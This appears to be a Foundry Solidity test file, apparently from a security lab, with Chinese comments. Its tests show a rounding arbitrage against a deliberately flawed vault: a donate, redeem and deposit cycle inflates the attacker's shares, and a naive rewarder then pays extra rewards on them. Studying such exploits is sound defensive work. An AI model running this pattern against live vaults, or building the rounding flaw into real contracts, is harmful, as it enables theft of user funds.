// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import "../../src/vulns/RoundingVaultBad.sol";

contract SimpleRewarder {
    IERC20 public immutable rewardToken;
    IERC20 public immutable shareToken; // vault shares (ERC20)

    mapping(address => uint256) public claimed;

    constructor(IERC20 _rewardToken, IERC20 _shareToken) {
        rewardToken = _rewardToken;
        shareToken = _shareToken;
    }

    // 每 1 share 发 1 reward（单位=rewardToken最小单位）
    function claim() external returns (uint256 amt) {
        uint256 entitled = shareToken.balanceOf(msg.sender); // 按当前 shares 计
        uint256 already = claimed[msg.sender];
        require(entitled >= already, "bad state");
        amt = entitled - already;
        claimed[msg.sender] = entitled;
        require(rewardToken.transfer(msg.sender, amt), "rt");
    }
}

contract MockERC20 is ERC20 {
    constructor() ERC20("Mock", "MOCK") {}

    function mint(address to, uint256 amt) external {
        _mint(to, amt);
    }
}

contract D19_RoundingVaultTest is Test {
    MockERC20 token;
    RoundingVaultBad vault;

    address alice = address(0xA11CE);
    address attacker = address(0xBEEF);

    function setUp() public {
        token = new MockERC20();
        vault = new RoundingVaultBad(token);

        token.mint(alice, 1_000_000 ether);
        token.mint(attacker, 1_000_000 ether);

        vm.prank(alice);
        token.approve(address(vault), type(uint256).max);

        vm.prank(attacker);
        token.approve(address(vault), type(uint256).max);
    }

    /// 1) 边界：小额存款会不会卡到 zero shares（刚跨过 1 share 的临界）
    function test_boundary_small_deposit_minShare() public {
        // 初始化：Alice 存 1e18 得 1e18 shares
        vm.prank(alice);
        vault.deposit(100 ether, alice);

        // 通过 donate 改变比例，让 “极小存款” 变成 0 share（被 require 拦住）
        vm.prank(attacker);
        vault.donate(10_000 ether);

        // 现在小额 deposit 很可能 shares=0 -> revert
        vm.expectRevert("zero shares");
        vm.prank(attacker);
        vault.deposit(1 wei, attacker);
    }

    /// 2) 可复现套利：利用不一致舍入，分多次小额循环，累计拿到多 1 wei、2 wei...
    function test_arbitrage_single_cycle_obvious() public {
        // 用小整数，效果最直观（单位都是 token 的最小单位）
        // 1) Alice 初始化 100:100
        vm.prank(alice);
        vault.deposit(100, alice);
        assertEq(vault.totalSupply(), 100);
        assertEq(vault.totalAssets(), 100);

        // 2) attacker 存 1，拿到 1 share
        vm.prank(attacker);
        vault.deposit(1, attacker);
        assertEq(vault.balanceOf(attacker), 1);
        assertEq(vault.totalSupply(), 101);
        assertEq(vault.totalAssets(), 101);

        // 3) attacker donate 1：只增资产，不增 shares => ta=102, ts=101
        vm.prank(attacker);
        vault.donate(1);
        assertEq(vault.totalSupply(), 101);
        assertEq(vault.totalAssets(), 102);

        // 4) attacker redeem 1 share：ceil(102/101)=2，多拿 1 个单位
        uint256 balBefore = token.balanceOf(attacker);
        vm.prank(attacker);
        uint256 out = vault.redeem(1, attacker, attacker);
        assertEq(out, 2);
        assertEq(token.balanceOf(attacker), balBefore + 2);

        // 此时池子回到 100:100
        assertEq(vault.totalSupply(), 100);
        assertEq(vault.totalAssets(), 100);

        // 5) attacker deposit 2：mint 2 shares
        vm.prank(attacker);
        vault.deposit(2, attacker);

        // ✅ attacker shares 从 1 变 2（凭空多 1 share）
        assertEq(vault.balanceOf(attacker), 2);
    }

    /// 3) 大额边界：检查是否溢出、是否精度损失巨大
    function test_boundary_large_values() public {
        vm.prank(alice);
        vault.deposit(500_000 ether, alice);

        // 大额 donate 改变比例
        vm.prank(attacker);
        vault.donate(400_000 ether);

        // 大额 deposit / redeem 不应溢出（这里主要验证逻辑稳定）
        vm.prank(attacker);
        uint256 shares = vault.deposit(100_000 ether, attacker);
        vm.prank(attacker);
        uint256 assetsOut = vault.redeem(shares / 2, attacker, attacker);

        assertGt(assetsOut, 0);
    }

    function test_profit_via_rewarder_when_shares_inflate() public {
        // 准备 reward token
        MockERC20 reward = new MockERC20();
        // 给 rewarder 充足奖励
        reward.mint(address(this), 1_000_000);

        // 部署 rewarder：shareToken 就是 vault（它继承 ERC20）
        SimpleRewarder rewarder = new SimpleRewarder(
            reward,
            IERC20(address(vault))
        );
        reward.transfer(address(rewarder), 1_000_000);

        // 1) Alice 初始化 100:100
        vm.prank(alice);
        vault.deposit(100, alice);

        // 2) attacker 存 1（拿到 1 share）
        vm.prank(attacker);
        vault.deposit(1, attacker);
        assertEq(vault.balanceOf(attacker), 1);

        // attacker 先领一次：应得 1
        uint256 r0 = reward.balanceOf(attacker);
        vm.prank(attacker);
        rewarder.claim();
        assertEq(reward.balanceOf(attacker), r0 + 1);

        // 3) donate 1 制造 ta=ts+1
        vm.prank(attacker);
        vault.donate(1);

        // 4) redeem(1) 拿到 2
        vm.prank(attacker);
        vault.redeem(1, attacker, attacker);

        // 5) deposit(2) 变成 2 shares（份额膨胀）
        vm.prank(attacker);
        vault.deposit(2, attacker);
        assertEq(vault.balanceOf(attacker), 2);

        // attacker 再领一次：现在 entitled=2，之前 claimed=1，所以再领 1
        uint256 r1 = reward.balanceOf(attacker);
        vm.prank(attacker);
        rewarder.claim();
        assertEq(reward.balanceOf(attacker), r1 + 1);

        // ✅ 这就是“净赚”：reward 增加来自 share 膨胀（而不是底层资产）
    }
}
